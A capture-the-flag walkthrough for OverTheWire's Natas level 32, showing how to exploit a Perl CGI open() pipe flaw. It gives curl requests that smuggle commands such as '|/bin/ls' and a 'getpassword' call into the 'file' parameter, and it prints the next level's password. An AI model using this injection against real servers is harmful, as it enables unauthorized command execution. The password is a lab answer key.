# Natas Level 32 → 33

## Goal

Identical vulnerability to level 31 — Perl's `@ARGV` → diamond operator → `open("|cmd")` — but now there's a **helper binary** called `getpassword` on the server, and the exploit executes it via the same pipe trick.

## Concepts you'll learn

- Re-using a technique with a different helper binary in scope
- Exploring the server filesystem through the same CGI once you have code execution
- Recognising when two levels are structurally the same but graded for execution (not insight)

## Walkthrough

### 1. Find the helper

Poke around with level 31's trick, applied to `ls`:

```bash
$ curl -u natas32:<pass> \
       "http://natas32.natas.labs.overthewire.org/index.pl?file=|/bin/ls /var/www/natas/natas32/"
```

Among the output:

```
getpassword
index.pl
```

`getpassword` looks promising. Try running it:

### 2. Run the helper

```bash
$ curl -u natas32:<pass> \
       "http://natas32.natas.labs.overthewire.org/index.pl?file=|/var/www/natas/natas32/getpassword"
```

Or the trailing-pipe variant:

```bash
$ curl -u natas32:<pass> \
       "http://natas32.natas.labs.overthewire.org/index.pl?file=/var/www/natas/natas32/getpassword|"
```

The binary (running as the `natas33` user, presumably via setuid or group perms) reads the `natas33` password file and prints:

```
shoogeiGa2yee3de6Aex8uaXeech5eey
```

## The answer

The password for `natas33` is:

**`shoogeiGa2yee3de6Aex8uaXeech5eey`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <http://natas32.natas.labs.overthewire.org/>
